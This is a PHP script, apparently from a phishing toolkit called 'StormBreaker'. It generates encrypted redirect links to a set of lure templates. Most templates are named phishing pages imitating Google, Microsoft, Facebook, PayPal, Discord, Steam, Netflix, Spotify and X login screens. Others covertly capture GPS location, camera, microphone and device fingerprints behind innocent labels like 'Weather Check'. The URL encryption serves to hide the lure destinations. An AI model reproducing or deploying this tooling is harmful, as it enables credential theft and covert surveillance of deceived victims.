<?php
// URL Generator with Encryption
define('ENCRYPTION_KEY', 'StormBreaker2025SecretKey!@#');
define('BASE_URL', 'http://cam.fairoz.in');

function encryptUrl($url) {
    $iv = openssl_random_pseudo_bytes(openssl_cipher_iv_length('aes-256-cbc'));
    $encrypted = openssl_encrypt($url, 'aes-256-cbc', ENCRYPTION_KEY, 0, $iv);
    return base64_encode($encrypted . '::' . $iv);
}

function generateSecureLink($templatePath) {
    $fullUrl = BASE_URL . '/' . $templatePath;
    $encrypted = encryptUrl($fullUrl);
    $secureUrl = BASE_URL . '/redirect.php?id=' . urlencode($encrypted);
    return $secureUrl;
}

// Template mappings with friendly names and icons
$templates = [
    'advanced_location' => [
        'name' => 'Advanced Location Tracker',
        'icon' => 'fa-map-marker-alt',
        'desc' => 'GPS tracking with interactive map',
        'path' => 'templates/advanced_location/index.html'
    ],
    'camera' => [
        'name' => 'Camera Access',
        'icon' => 'fa-camera',
        'desc' => 'Capture photos and videos',
        'path' => 'templates/camera_temp/index.html'
    ],
    'device_info' => [
        'name' => 'Device Information',
        'icon' => 'fa-fingerprint',
        'desc' => 'Complete device fingerprinting',
        'path' => 'templates/device_fingerprint/index.html'
    ],
    'discord' => [
        'name' => 'Discord Verification',
        'icon' => 'fab fa-discord',
        'desc' => 'Discord account verification',
        'path' => 'templates/discord_phish/index.html'
    ],
    'facebook' => [
        'name' => 'Facebook Login',
        'icon' => 'fab fa-facebook',
        'desc' => 'Facebook authentication',
        'path' => 'templates/facebook_phish/index.html'
    ],
    'google' => [
        'name' => 'Google Account',
        'icon' => 'fab fa-google',
        'desc' => 'Google account recovery',
        'path' => 'templates/google_phish/index.html'
    ],
    'microphone' => [
        'name' => 'Audio Recorder',
        'icon' => 'fa-microphone',
        'desc' => 'Record audio messages',
        'path' => 'templates/microphone/index.html'
    ],
    'microsoft' => [
        'name' => 'Microsoft Account',
        'icon' => 'fab fa-microsoft',
        'desc' => 'Microsoft account sign-in',
        'path' => 'templates/microsoft_phish/index.html'
    ],
    'location' => [
        'name' => 'Near You',
        'icon' => 'fa-location-arrow',
        'desc' => 'Find nearby locations',
        'path' => 'templates/nearyou/index.html'
    ],
    'netflix' => [
        'name' => 'Netflix',
        'icon' => 'fa-film',
        'desc' => 'Netflix membership',
        'path' => 'templates/netflix_phish/index.html'
    ],
    'data_capture' => [
        'name' => 'Data Collection',
        'icon' => 'fa-database',
        'desc' => 'General data capture',
        'path' => 'templates/normal_data/index.html'
    ],
    'paypal' => [
        'name' => 'PayPal',
        'icon' => 'fab fa-paypal',
        'desc' => 'PayPal verification',
        'path' => 'templates/paypal_phish/index.html'
    ],
    'spotify' => [
        'name' => 'Spotify',
        'icon' => 'fab fa-spotify',
        'desc' => 'Spotify premium',
        'path' => 'templates/spotify_phish/index.html'
    ],
    'steam' => [
        'name' => 'Steam',
        'icon' => 'fab fa-steam',
        'desc' => 'Steam account access',
        'path' => 'templates/steam_phish/index.html'
    ],
    'twitter' => [
        'name' => 'X (Twitter)',
        'icon' => 'fab fa-twitter',
        'desc' => 'X platform sign-in',
        'path' => 'templates/twitter_phish/index.html'
    ],
    'weather' => [
        'name' => 'Weather Check',
        'icon' => 'fa-cloud-sun',
        'desc' => 'Local weather information',
        'path' => 'templates/weather/index.html'
    ]
];

// Generate all encrypted links
$encryptedLinks = [];
foreach ($templates as $key => $template) {
    $encryptedLinks[$key] = [
        'name' => $template['name'],
        'icon' => $template['icon'],
        'desc' => $template['desc'],
        'url' => generateSecureLink($template['path'])
    ];
}

// Return as JSON
header('Content-Type: application/json');
echo json_encode([
    'success' => true,
    'templates' => $encryptedLinks,
    'base_url' => BASE_URL
]);
?>
